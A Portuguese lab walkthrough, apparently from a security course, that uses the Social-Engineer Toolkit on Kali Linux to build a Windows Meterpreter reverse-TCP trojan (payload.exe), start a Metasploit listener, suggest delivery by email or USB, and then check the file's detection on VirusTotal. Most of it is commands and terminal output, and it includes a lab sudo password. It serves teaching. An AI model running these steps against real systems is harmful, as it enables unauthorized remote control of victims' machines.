# -Criando-um-Trojan-de-Acesso-Remoto-com-o-Social-Engineer-Toolkit-do-Kali-Linux

Abra o Terminal e execute o seguinte comando (com senha “rnpesr”) para ser super usuário:

Copy
┌──(aluno㉿kali)-[~]
└─$ sudo -i
[sudo] senha para aluno:
Acesse o SEToolkit:

Copy
┌──(root㉿kali)-[~]
└─# setoolkit
A seguinte janela será apresentada no Terminal. Selecione a opção 1 e aperte “ENTER”:

Copy
          !\_________________________/!\
          !!                         !! \
          !! Social-Engineer Toolkit !!  \
          !!                         !!  !
          !!          Free           !!  !
          !!                         !!  !
          !!          #hugs          !!  !
          !!                         !!  !
          !!      By: TrustedSec     !!  /
          !!_________________________!! /
          !/_________________________\!/
             __\_________________/__/!_
            !_______________________!/
          ________________________
         /oooo  oooo  oooo  oooo /!
        /ooooooooooooooooooooooo/ /
       /ooooooooooooooooooooooo/ /
      /C=_____________________/_/

[---]        The Social-Engineer Toolkit (SET)         [---]
[---]        Created by: David Kennedy (ReL1K)         [---]
                      Version: 8.0.3
                    Codename: 'Maverick'
[---]        Follow us on Twitter: @TrustedSec         [---]
[---]        Follow me on Twitter: @HackingDave        [---]
[---]       Homepage: https://www.trustedsec.com       [---]
        Welcome to the Social-Engineer Toolkit (SET).
         The one stop shop for all of your SE needs.

   The Social-Engineer Toolkit is a product of TrustedSec.

           Visit: https://www.trustedsec.com

   It's easy to update using the PenTesters Framework! (PTF)
Visit https://github.com/trustedsec/ptf to update all your tools!


 Select from the menu:

   1) Social-Engineering Attacks
   2) Penetration Testing (Fast-Track)
   3) Third Party Modules
   4) Update the Social-Engineer Toolkit
   5) Update SET configuration
   6) Help, Credits, and About

  99) Exit the Social-Engineer Toolkit

Set> 1
A seguinte janela será apresentada no Terminal. Selecione a opção 4 e aperte “ENTER”:

Copy
              ________________________
              __  ___/__  ____/__  __/
              _____ \__  __/  __  /
              ____/ /_  /___  _  /
              /____/ /_____/  /_/     

[---]        The Social-Engineer Toolkit (SET)         [---]
[---]        Created by: David Kennedy (ReL1K)         [---]
                      Version: 8.0.3
                    Codename: 'Maverick'
[---]        Follow us on Twitter: @TrustedSec         [---]
[---]        Follow me on Twitter: @HackingDave        [---]
[---]       Homepage: https://www.trustedsec.com       [---]
        Welcome to the Social-Engineer Toolkit (SET).
         The one stop shop for all of your SE needs.

   The Social-Engineer Toolkit is a product of TrustedSec.

           Visit: https://www.trustedsec.com

   It's easy to update using the PenTesters Framework! (PTF)
Visit https://github.com/trustedsec/ptf to update all your tools!


 Select from the menu:

   1) Spear-Phishing Attack Vectors
   2) Website Attack Vectors
   3) Infectious Media Generator
   4) Create a Payload and Listener
   5) Mass Mailer Attack
   6) Arduino-Based Attack Vector
   7) Wireless Access Point Attack Vector
   8) QRCode Generator Attack Vector
   9) Powershell Attack Vectors
  10) Third Party Modules

  99) Return back to the main menu.

set> 4
Escolha a opção 5 para criar um executável (Windows) com um Trojan de acesso remoto:

Copy
   1) Windows Shell Reverse_TCP               Spawn a command shell on victim and send back to attacker
   2) Windows Reverse_TCP Meterpreter         Spawn a meterpreter shell on victim and send back to attacker
   3) Windows Reverse_TCP VNC DLL             Spawn a VNC server on victim and send back to attacker
   4) Windows Shell Reverse_TCP X64           Windows X64 Command Shell, Reverse TCP Inline
   5) Windows Meterpreter Reverse_TCP X64     Connect back to the attacker (Windows x64), Meterpreter
   6) Windows Meterpreter Egress Buster       Spawn a Meterpreter shell and find a port home via multiple ports
   7) Windows Meterpreter Reverse HTTPS       Tunnel communication over HTTP using SSL and use Meterpreter
   8) Windows Meterpreter Reverse DNS         Use a hostname instead of an IP address and use Reverse Meterpreter
   9) Download/Run your Own Executable        Downloads an executable and runs it

set:payloads>5
Insira su endereço IP:

Copy
set:payloads> IP address for the payload listener (LHOST): 192.168.98.40
Insira a porta de escuta reversa com o valor 7777 (ainda não escreva “yes”):

Copy
set:payloads> Enter the PORT for the reverse listener: 7777
[*] Generating the payload.. please be patient.
[*] Payload has been exported to the default SET directory located under: /root/.set/payload.exe
Abra um segundo Terminal e verifique que o Payload foi criado:

Copy
┌──(aluno㉿kali)-[~]
└─$ sudo -i
[sudo] senha para aluno:

┌──(root㉿kali)-[~]
└─# cd /root/.set/
                                                                                                                
┌──(root㉿kali)-[~/.set]
└─# ls
meta_config  payload.exe  set.options  version.lock
O executável que implementará o Trojan de acesso remoto é o “payload.exe”. Para poder controlar a máquina Windows, os seguintes passos são necessários:

A máquina vítima (Windows) deve ser XP com SP1. Versões mais atuais (Windows 8 em diante) não são vulneráveis.

O arquivo “payload.exe” deve ser enviado de alguma maneira para a máquina vítima (e-mail, pen-drive, cd, etc...).

A máquina vítima deve estar na sua mesma rede local.

Após os requisitos mostrados acima serem atendidos, no segundo Terminal, você deve criar o servidor HTTP de escuta com o comando (no segundo terminal):

Copy
┌──(root㉿kali)-[~/.set]
└─# python -m http.server 80          
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
Volte ao primeiro Terminal e inicialize a escuta escrevendo “yes”:

Copy
set:payloads> Do you want to start the payload and listener now? (yes/no): yes
[*] Launching msfconsole, this could take a few to load. Be patient...
Metasploit tip: View a module's description using info, or the enhanced 
version in your browser with info -d
                                                  

MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMM                MMMMMMMMMM
MMMN$                           vMMMM
MMMNl  MMMMM             MMMMM  JMMMM
MMMNl  MMMMMMMN       NMMMMMMM  JMMMM
MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM
MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM
MMMMR  ?MMNM             MMMMM .dMMMM
MMMMNm `?MMM             MMMM` dMMMMM
MMMMMMN  ?MM             MM?  NMMMMMN
MMMMMMMMNe                 JMMMMMNMMM
MMMMMMMMMMNm,            eMMMMMNMMNMM
MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
        https://metasploit.com


       =[ metasploit v6.3.54-dev                          ]
+ -- --=[ 2394 exploits - 1235 auxiliary - 422 post       ]
+ -- --=[ 1388 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

[*] Processing /root/.set/meta_config for ERB directives.
resource (/root/.set/meta_config)> use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
resource (/root/.set/meta_config)> set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
resource (/root/.set/meta_config)> set LHOST 192.168.98.40
LHOST => 192.168.98.40
resource (/root/.set/meta_config)> set LPORT 7777
LPORT => 7777
resource (/root/.set/meta_config)> set ExitOnSession false
ExitOnSession => false
resource (/root/.set/meta_config)> exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.98.40:7777 
msf6 exploit(multi/handler) >
Caso você queira executar esse Payload, uma máquina com Windows XP (sem aplicação de patches nem atualizações) na sua rede local deve executar o arquivo gerado “payload.exe” para ganhar acesso! Este passo não será aplicado no laboratório.

Ainda no primeiro Terminal, aperte 3 vezes “Ctrl + C” e feche o Terminal. No segundo Terminal, copie o arquivo “payload.exe” para a pasta Download:

Copy
┌──(root㉿kali)-[~/.set]
└─# cp payload.exe /home/aluno/Documentos/
Abra o Firefox e acesse o site do Virus Total. Aqui avaliaremos o arquivo “payload.exe” criado anteriormente:

Copy
www.virustotal.com/
Clique em “Chose file”, clique na pasta “Documentos”, abra o arquivo “payload.exe” e clique em “Confirm upload”. Na sequência responda o Captcha “I´m not a robot”. Obs: Pode ser que o site volte ao passo anterior, neste caso, repita o passo anterior e este passo.

Veja o score 56/73 (até o momento da execução deste laboratório) e que é categorizado como “Popular threat label; trojan.metasploit/rozena; Threat categories trojan; hacktool”:

Copy
56/73 security vendors and no sandboxes flagged this file as malicious
Reanalyze
7daa79bed72545aa8f4ab32ff0c7a7ac6f54a051bb1c0035c2fce87e7fc35bad
payload.exe
Caso queira, explore mais dados no site Virus Total. Feche o Firefox, volte ao Segundo terminal, apague o arquivo “payload.exe” da pasta Download e feche o Terminal:

Copy
┌──(root㉿kali)-[~/.set]
└─# cd /home/aluno/Documentos/ 

┌──(root㉿kali)-[/home/aluno/Documentos]
└─# rm payload.exe
